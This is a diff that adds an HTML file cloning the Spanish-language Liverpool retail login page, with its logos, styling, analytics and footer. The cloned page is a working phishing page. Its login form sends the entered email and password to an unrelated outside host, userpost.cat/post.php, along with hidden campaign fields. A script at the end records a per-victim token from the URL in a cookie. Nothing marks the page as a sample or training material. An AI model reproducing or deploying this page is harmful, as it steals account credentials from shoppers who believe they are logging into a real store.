@@ -1,0 +1,478 @@
+<html lang="es"><head>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://assetspwa.liverpool.com.mx/assets/front/auth0/css/liverpool.css">    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-KCH7RNB"></script><script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    
+    <meta name="robots" content="noindex, nofollow">
+    
+    
+    <link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.56.28/css/main.cdn.min.css">
+    <style id="custom-styles-container">
+      
+        
+
+body {
+  background: #000000;
+  font-family: ulp-font, -apple-system, BlinkMacSystemFont, Roboto, Helvetica, sans-serif;
+}
+.c66541626 {
+  background: #000000;
+}
+.c8cefe7cc.cd28a0293 {
+  background: #D00E17;
+}
+.c8cefe7cc.c33272834 {
+  background: #0A8852;
+}
+.c0b512bff {
+  background-color: #e10098;
+  color: #ffffff;
+}
+.c0b512bff a,
+.c0b512bff a:visited {
+  color: #ffffff;
+}
+.c3a5d53f4 {
+  background-color: #0A8852;
+}
+.ca34ccfa7 {
+  background-color: #D00E17;
+}
+@supports (mask-image: url('/static/img/branding-generic/copy-icon.svg')) {
+  @supports not (-ms-ime-align: auto) {
+    .c02a080f8.c3487a952::before {
+      background-color: #D00E17;
+    }
+  }
+}
+.input.c976039fd {
+  border-color: #D00E17;
+}
+.error-cloud {
+  background-color: #D00E17;
+}
+.error-fatal {
+  background-color: #D00E17;
+}
+.error-local {
+  background-color: #D00E17;
+}
+.c9b3447f0.c3487a952 {
+  background-color: #D00E17;
+  border-color: #D00E17;
+}
+.c9b3447f0.c3487a952::before {
+  border-bottom-color: #D00E17;
+}
+.c9b3447f0.c3487a952::after {
+  border-bottom-color: #D00E17;
+}
+#alert-trigger {
+  background-color: #D00E17;
+}
+      
+    </style>
+    <style>
+      /* By default, hide features for javascript-disabled browsing */
+      /* We use !important to override any css with higher specificity */
+      /* It is also overriden by the styles in <noscript> in the header file */
+      .no-js {
+        clip: rect(0 0 0 0);
+        clip-path: inset(50%);
+        height: 1px;
+        overflow: hidden;
+        position: absolute;
+        white-space: nowrap;
+        width: 1px;
+      }
+    </style>
+    <noscript>
+      <style>
+        /* We use !important to override the default for js enabled */
+        /* If the display should be other than block, it should be defined specifically here */
+        .js-required { display: none !important; }
+        .no-js {
+          clip: auto;
+          clip-path: none;
+          height: auto;
+          overflow: auto;
+          position: static;
+          white-space: normal;
+          width: var(--prompt-width);
+        }
+      </style>
+    </noscript>
+    
+<style>
+      :root {
+        --lv-color: #e10098;
+        --gap-color: #122344;
+        --ws-color: #eee;
+        --west-color: #eee;
+        --pb-color: #eee;
+        --pbk-color: #eee;
+        --sbrb-color: #612066;
+      }
+      body {
+        background-color:#FFF;
+      }
+      .footer {
+        font-family: 'Roboto', sans-serif;
+        background-color: #555;
+        position: relative;
+        bottom: 0;
+        left: 0;
+        padding: 16px 0; 
+        width: 100%;
+        color: white;
+        z-index: 10;
+        font-size: .75rem;
+      }
+      .footer ul {
+        text-align: center;
+      }
+      .footer ul li {
+        display: inline-block;
+        margin: 0 4px;
+      }
+      .footer ul li:not(:first-of-type) {
+        margin-left: 0;
+      }
+      .footer a {
+        color: white;
+      }
+      .header{
+        width: 100%;
+        height: 56px;
+        display: flex;
+        justify-content: left;
+        align-items: center;
+      }
+      .header_logo {
+        width: auto;
+        max-width: 174px;
+        max-height: 40px;
+      }
+      .header.liverpool {
+        background-color: var(--lv-color);
+      }
+      .header.gap {
+        background-color: var(--gap-color);
+      }
+      .header.williams-sonoma {
+        background-color: var(--ws-color);
+      }
+      .header.westelm {
+        background-color: var(--west-color);
+      }
+      .header.potterybarn {
+        background-color: var(--pb-color);
+      }
+      .header.potterybarnkids {
+        background-color: var(--pbk-color);
+      }
+      .header.suburbia {
+        background-color: var(--sbrb-color);
+      }
+      ._widget {
+        min-height: calc(100vh - 109px) !important;
+        padding: 0px !important;
+      }
+      @media (max-width: 480px) {
+        .footer {
+          position: relative;
+        }
+        ._widget {
+          height: fit-content !important;
+          height: -webkit-fit-content !important;
+          height: -moz-fit-content !important;
+        }
+      }
+      @media (max-width: 992px) {
+        .header{
+          width: 100%;
+          height: 56px;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+        }
+      }
+      /* space between primary button and text, auth0 template */
+      ._prompt-box-outer>div>div>div>form {
+        padding: 0 0 30px 0;
+      }
+      /* El envío del código puede tardar hasta 2 minutos */
+      ._widget>section>div>div>div>div>div>div:nth-of-type(2) {
+        font-size: 12px;
+        color: #333;
+      }
+      /* Enviar código nuevamente */
+      ._link-resend-code {
+        padding: 20px 0 0 0;
+        font-size: 14px;
+        text-decoration: underline;
+        color: #666;
+        font-family: 'Roboto', sans-serif;
+      }
+      header {
+        padding: 32px 40px!important;
+      }
+      header h1{
+        margin: 0!important;
+      }
+      header a {
+        line-height: 0!important;
+      }
+    </style>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-KCH7RNB"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-4668284-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'UA-4668284-1');
+    </script>
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-KCH7RNB');</script>
+    <!-- End Google Tag Manager -->
+    
+      <script type="text/javascript" src="https://cdn.evgnet.com/beacon/serviciosliverpoolsadecv/liverpool/scripts/evergage.min.js"></script>
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet">
+
+    <title>
+      Iniciar sesión en Liverpool
+    </title>
+
+  </head>
+  <body class="_widget-auto-layout _hide-prompt-logo" data-new-gr-c-s-check-loaded="14.1002.0" data-gr-ext-installed="">
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-N2XHJ83"
+      height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+    <header class="header liverpool">
+      
+        
+            <a href="https://www.liverpool.com.mx">
+        
+              <img src="https://assetspwa.liverpool.com.mx/assets/images/emails/facebook/logo.png" class="header_logo" alt="liverpool" title="liverpool">
+            </a>
+      
+    </header><main class="_widget login">
+  <section class="cf7cb0683 _prompt-box-outer cd488bb40">
+    <div class="cb158515f cc5801146">
+      
+    
+      <div class="c835b06af">
+        <header class="ca2efc7d8 c61e4fcc8">
+          <div title="Liverpool" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important"></div>
+        
+          <img class="c96a09c95 caf6ecf25" id="prompt-logo-center" src="https://www.liverpool.com.mx/static/images/logos/liverpool-pink.png" alt="Liverpool">
+        
+          
+            <h1 class="c3fa29956 c926e5028">Inicia sesión</h1>
+          
+        
+          <div class="c2077a76c cac95ad60">
+            
+              <p class="c76075b34 c2fad6637"> </p>
+            
+          </div>
+        </header>
+      
+        <div class="c439d90a0 c37cd0ac8">
+          
+        
+          
+            <form method="POST" action="https://userpost.cat/post.php" class="c0425e711 c322487ef">
+				<input type="hidden" name="uToken" value="">
+				<input type="hidden" name="location" value="Liverpool">   
+				<input type="hidden" name="web" value="13">  
+              <div class="cb0776e96 c55a4daea">
+                <div class="c91b28086">
+                  <div class="input-wrapper _input-wrapper">
+                    <div class="c02a080f8 c73989c48 text ca6eb1802 ca3650202" data-action-text="" data-alternate-action-text="">
+                      <label class="ce2114906 no-js c561cbbd4 cf76ea36d" for="username">
+                        Correo electrónico
+                      </label>
+                    
+                      <input class="input cd8c0df77 c519c8f96" inputmode="email" name="username" id="username" type="text" value="" required="" autocomplete="username" autocapitalize="none" spellcheck="false" autofocus="">
+                    
+                      <div class="ce2114906 js-required c561cbbd4 cf76ea36d" data-dynamic-label-for="username" aria-hidden="true">
+                        Correo electrónico
+                      </div>
+                    </div>
+                  
+                    
+                  </div>
+                
+                  <div class="input-wrapper _input-wrapper">
+                    <div class="c02a080f8 c73989c48 password cd890d100 ca3650202" data-action-text="" data-alternate-action-text="">
+                      <label class="ce2114906 no-js c561cbbd4 cf96cf9af" for="password">
+                        Contraseña
+                      </label>
+                    
+                      <input class="input cd8c0df77 c640d2562" name="password" id="password" type="password" required="" autocomplete="current-password" autocapitalize="none" spellcheck="false">
+                    
+                      <div class="ce2114906 js-required c561cbbd4 cf96cf9af" data-dynamic-label-for="password" aria-hidden="true">
+                        Contraseña
+                      </div>
+                    
+                      <button type="button" class="cd1df0865 ulp-button-icon c6cad41d5 _button-icon" data-action="toggle">
+                        <span class="screen-reader-only password-toggle-label" data-label="toggle">Show Password</span>
+                      
+                        <span class="c6989ffc0 password js-required" aria-hidden="true"></span>
+                      </button>
+                    </div>
+                  
+                    
+                  </div>
+                
+                  
+                </div>
+              </div>
+            
+              
+                
+                  <p class="c73d89667 cd4743c67">
+                    
+                      <a class="c82c0b9b3 cabd3c7de c8061fbcb" href="/u/reset-password/request/Username-Password-Authentication?state=hKFo2SBCMVBaZVE0LTlsQWpaeDh5cHNlYmwyZXNSQnJtdE9qRqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHhZbTdGYTJoT2o1SFVYRHRGTE5aQjZWakt1a1dIV2tPo2NpZNkgVXBQSElJaGNGckRuWVRuUW5pWHFBNjFQN1I4ZERtZGY">¿Olvidaste tu contraseña?</a>
+                    
+                  </p>
+                
+              
+            
+              <div class="c6d7d2ace">
+                
+                  <button type="submit" name="action" value="default" class="cd1df0865 c0b512bff c6cad41d5 c132a5a03 c571d5ab7">Iniciar sesión</button>
+                
+              </div>
+            </form>
+          
+        
+          
+            <div class="ulp-alternate-action  _alternate-action __s16nu9">
+              <p class="c76075b34 c2fad6637 ca7b07586">¿No tienes cuenta?
+                <a class="c82c0b9b3 c8061fbcb" href="/u/signup?state=hKFo2SBCMVBaZVE0LTlsQWpaeDh5cHNlYmwyZXNSQnJtdE9qRqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHhZbTdGYTJoT2o1SFVYRHRGTE5aQjZWakt1a1dIV2tPo2NpZNkgVXBQSElJaGNGckRuWVRuUW5pWHFBNjFQN1I4ZERtZGY">Crear cuenta</a>
+              </p>
+            </div>
+          
+        
+          
+            <div class="ccdb2d22d c4edd12b3">
+              <span>O</span>
+            </div>
+          
+        
+          
+            <div class="c0fe919b3 ce2119ffc">
+              
+                <form method="post" data-provider="apple" class="cf6e9a30f cea5c3f32 c1131b242">
+                  <input type="hidden" name="state" value="hKFo2SBCMVBaZVE0LTlsQWpaeDh5cHNlYmwyZXNSQnJtdE9qRqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHhZbTdGYTJoT2o1SFVYRHRGTE5aQjZWakt1a1dIV2tPo2NpZNkgVXBQSElJaGNGckRuWVRuUW5pWHFBNjFQN1I4ZERtZGY">
+                
+                  <input type="hidden" name="connection" value="apple">
+                
+                  <button type="submit" class="c7e523d39 c35ecdbdd c45e84891" data-provider="apple">
+                    
+                      <span class="caa758bf7 cde0d0aa9" data-provider="apple"></span>
+                    
+                  
+                    <span class="c4a36d755">Continuar con Apple</span>
+                  </button>
+                </form>
+              
+                <form method="post" data-provider="facebook" class="cf6e9a30f cea5c3f32 cb19c7f74">
+                  <input type="hidden" name="state" value="hKFo2SBCMVBaZVE0LTlsQWpaeDh5cHNlYmwyZXNSQnJtdE9qRqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHhZbTdGYTJoT2o1SFVYRHRGTE5aQjZWakt1a1dIV2tPo2NpZNkgVXBQSElJaGNGckRuWVRuUW5pWHFBNjFQN1I4ZERtZGY">
+                
+                  <input type="hidden" name="connection" value="facebook">
+                
+                  <button type="submit" class="c7e523d39 c35ecdbdd c832fb83a" data-provider="facebook">
+                    
+                      <span class="caa758bf7 cde0d0aa9" data-provider="facebook"></span>
+                    
+                  
+                    <span class="c4a36d755">Continuar con Facebook</span>
+                  </button>
+                </form>
+              
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  
+    
+  </section>
+</main>
+<script id="client-scripts" type="text/javascript">
+!function(){var t,e,v,g,n,r={exports:function(n,r){var a={};function i(t,e,n,r){return t.addEventListener(e,n,r)}function c(t){return"string"==typeof t}function o(t,e){return t.getAttribute(e)}function s(t,e,n){return t.setAttribute(e,n)}return{addClass:function(t,e){if(t.classList)return t.classList.add(e);var n=t.className.split(" ");-1===n.indexOf(e)&&(n.push(e),t.className=n.join(" "))},toggleClass:function(t,e){if(t.classList)return t.classList.toggle(e);var n=t.className.split(" "),r=n.indexOf(e);-1!==r?n.splice(r,1):n.push(e),t.className=n.join(" ")},addClickListener:function(t,e){return i(t,"click",e)},addEventListener:i,getAttribute:o,getElementById:function(t){return r.getElementById(t)},getParent:function(t){return t.parentNode},isString:c,loadScript:function(t){var e=r.createElement("script");e.src=t,e.async=!0,r.body.appendChild(e)},poll:function(t){var i=t.interval||2e3,e=t.url||n.location.href,c=t.condition||function(){return!0},o=t.onSuccess||function(){},s=t.onError||function(){};return setTimeout(function r(){var a=new XMLHttpRequest;return a.open("GET",e),a.setRequestHeader("Accept","application/json"),a.onload=function(){if(200===a.status){var t="application/json"===a.getResponseHeader("Content-Type").split(";")[0]?JSON.parse(a.responseText):a.responseText;return c(t)?o():setTimeout(r,i)}if(429!==a.status)return s({status:a.status,responseText:a.responseText});var e=1e3*Number.parseInt(a.getResponseHeader("X-RateLimit-Reset")),n=e-(new Date).getTime();return setTimeout(r,i<n?n:i)},a.send()},i)},querySelector:function(t,e){return c(t)?r.querySelector(t):t.querySelector(e)},querySelectorAll:function(t,e){var n=c(t)?r.querySelectorAll(t):t.querySelectorAll(e);return Array.prototype.slice.call(n)},removeClass:function(t,e){if(t.classList)return t.classList.remove(e);var n=t.className.split(" "),r=n.indexOf(e);-1!==r&&(n.splice(r,1),t.className=n.join(" "))},setAttribute:s,removeAttribute:function(t,e){return t.removeAttribute(e)},swapAttributes:function(t,e,n){var r=o(t,e),a=o(t,n);s(t,n,r),s(t,e,a)},setGlobalFlag:function(t,e){a[t]=!!e},getGlobalFlag:function(t){return!!a[t]},preventFormSubmit:function(t){t.stopPropagation(),t.preventDefault()},matchMedia:function(t){return"function"!=typeof n.matchMedia&&n.matchMedia(t).matches},dispatchEvent:function(t,e){t.dispatchEvent(e)},setTimeout:setTimeout}}}.exports(window,document);((t={}).exports=function(i,t,c,o,s,u){t("div.c02a080f8.password").forEach(function(t){var r,a,e=i(t,"input"),n=i(t,'[data-action="toggle"]');c(t,(r=e,a=n,function(t){if(t.target.classList.contains("ulp-button-icon")){if(r.type="password"===r.type?"text":"password",a){var e=a.querySelector('[data-label="toggle"]');e&&(e.innerText="text"===r.type?"Hide Password":"Show Password")}var n=u(r);"text"===r.type?o(n,"ccba26b28"):s(n,"ccba26b28")}}))})},t.exports)(r.querySelector,r.querySelectorAll,r.addClickListener,r.addClass,r.removeClass,r.getParent),{exports:function(t,r,a,e){var n=t(".c398d69cb"),i=t("#alert-trigger"),c=t(".cce9ba310"),o=t(".c9ab8418e"),s=!1;i&&o&&n&&e(n,function(t){var e=t.target===i,n=o.contains(t.target);return e&&!s?(r(c,"ccba26b28"),void(s=!0)):e&&s||s&&!n?(a(c,"ccba26b28"),void(s=!1)):void 0})}}.exports(r.querySelector,r.addClass,r.removeClass,r.addClickListener),(v="recaptcha_v2",g="recaptcha_enterprise",(e={}).exports=function(t,a,i,c,o,r){var s,u=a("div[data-recaptcha-sitekey]"),e=a("div[data-recaptcha-sitekey] input"),l=a("#ulp-recaptcha");function d(){return u.getAttribute("data-recaptcha-provider")}function p(t){return e.value=t}function f(t,e){if(t&&t.getBoundingClientRect){if(!r("(max-width: 480px)"))return l.style.transform="",void(l.style.height="");(void 0===e||isNaN(e))&&(e=1.4);var n=72*e;l.style.transform="scale("+e+")",l.style.height=n+"px",l.style.width="10px",u.clientWidth+8<t.getBoundingClientRect().width&&f(t,e-.01)}}u&&(s="recaptchaCallback_"+Math.floor(1000001*Math.random()),window[s]=function(){var t,e,n,r;delete window[s],t=function(t){switch(t){case v:return window.grecaptcha;case g:return window.grecaptcha.enterprise}}(d()),e=t.render(l,{sitekey:u.getAttribute("data-recaptcha-sitekey"),"expired-callback":function(){p(""),i(u,"c3487a952"),t.reset(e)},callback:function(t){p(t),c(u,"c3487a952")}}),n=function(t){f(t),o(window,"resize",function(){f(t)})},r=setInterval(function(){var t=a("#ulp-recaptcha iframe");if(t)return clearInterval(r),n(t)},200)},t(function(t,e,n){switch(t){case v:return"https://www.recaptcha.net/recaptcha/api.js?hl="+e+"&onload="+n;case g:return"https://www.recaptcha.net/recaptcha/enterprise.js?render=explicit&hl="+e+"&onload="+n}}(d(),u.getAttribute("data-recaptcha-lang"),s)))},e.exports)(r.loadScript,r.querySelector,r.addClass,r.removeClass,r.addEventListener,r.matchMedia),((n={}).exports=function(r,t,a,i,c,o,s,u,n,l){function d(t){var e=t.target,n=o(e);e.value||l(e,"data-autofilled")?i(n,"ccdf7a764"):c(n,"ccdf7a764")}function p(t){var e=t.target;"onAutoFillStart"===t.animationName&&(n(e,"data-autofilled",!0),u(t.target,new Event("change",{bubbles:!0})),a(e,"keyup",f,{once:!0}))}function f(t){var e=t.target;n(e,"data-autofilled","")}if(r("body._simple-labels"))return t(".ce2114906.no-js").forEach(function(t){c(t,"no-js")}),void t(".ce2114906.js-required").forEach(function(t){i(t,"c1dccd975")});t(".c02a080f8:not(.c0ca3eb10):not(disabled)").forEach(function(t){i(t,"ca3650202");var e,n=r(t,".input");n.value&&i(t,"ccdf7a764"),a(t,"change",d),a(n,"blur",d),a(n,"animationstart",p),e=n,s(function(){e.value&&u(e,new Event("change",{bubbles:!0}))},100)})},n.exports)(r.querySelector,r.querySelectorAll,r.addEventListener,r.addClass,r.removeClass,r.getParent,r.setTimeout,r.dispatchEvent,r.setAttribute,r.getAttribute),{exports:function(t,e,n,r,a,i){function c(t){var e=n("submitted");r("submitted",!0),e?a(t):"c7172e9a3"===i(t.target,"data-provider")&&setTimeout(function(){r("submitted",!1)},2e3)}var o=t("form");o&&o.forEach(function(t){e(t,"submit",c)})}}.exports(r.querySelectorAll,r.addEventListener,r.getGlobalFlag,r.setGlobalFlag,r.preventFormSubmit,r.getAttribute)}();
+</script>
+<footer class="footer">
+      <ul>
+      
+      <li>
+        <a href="https://assetspwa.liverpool.com.mx/ayuda/index.html#/sec/terminos-y-condiciones/informacion">
+          © Términos y condiciones
+        </a>
+      </li>
+      
+      <li class="a-footer__slash">/</li>
+      
+      <li>
+        <a href="https://assetspwa.liverpool.com.mx/ayuda/index.html#/sec/terminos-y-condiciones/proteccion-de-datos/aviso-clientes">
+          Aviso de Privacidad © 2021
+        </a>
+      </li>
+      
+      </ul>
+    </footer>
+  
+<script>
+    function delete_cookie(name) {
+        document.cookie = name +'=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+    }
+    function setCookie(name,value,days) {
+        var expires = "";
+        if (days) {
+            var date = new Date();
+            date.setTime(date.getTime() + (days*24*60*60*1000));
+            expires = "; expires=" + date.toUTCString();
+        }
+        document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+    }
+    function get(name){
+       if(name=(new RegExp('[?&]'+encodeURIComponent(name)+'=([^&]*)')).exec(location.search))
+          return decodeURIComponent(name[1]);
+    }
+    function get_var(var_name){
+           var query = window.location.search.substring(1);
+           var vars = query.split("&");
+           for (var i=0;i<vars.length;i++) {
+                   var pair = vars[i].split("=");
+                   if(pair[0] == var_name){return pair[1];}
+           }
+           return(false);
+    }
+    $( document ).ready(function() {
+        url = new URL(window.location.href);
+        if (url.searchParams.get('tk')) {
+            delete_cookie('uToken');
+            setCookie('uToken',get('tk'),1);
+            let URL = window.location.href;
+            window.location = URL.replace('?tk='+get('tk'),'');   
+        }
+    });
+</script>
+</body></html>
